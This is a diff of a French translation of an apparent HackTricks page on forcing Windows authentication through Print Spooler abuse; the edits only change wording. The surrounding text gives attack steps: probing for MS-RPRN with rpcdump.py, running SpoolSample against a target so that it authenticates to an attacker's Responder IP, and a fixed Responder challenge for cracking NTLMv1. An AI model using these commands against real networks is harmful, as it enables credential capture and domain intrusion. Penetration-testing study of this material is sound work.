@@ -8,7 +8,7 @@
 
 ## Abus du service Spooler
 
-Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et lui dire simplement d'**envoyer la notification à un système**.\
+Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et simplement lui dire d'**envoyer la notification à un système**.\
 Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte d'ordinateur** dans cette authentification.
 
 ### Trouver des serveurs Windows sur le domaine
@@ -30,7 +30,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
 ### Demandez au service de s'authentifier contre un hôte arbitraire
 
-Vous pouvez compiler[ **SpoolSample à partir d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Vous pouvez compiler[ **SpoolSample depuis ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -103,6 +103,6 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ## Cracking NTLMv1
 
 Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;emember que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
+&#xNAN;_&#x52;appelez-vous que pour craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
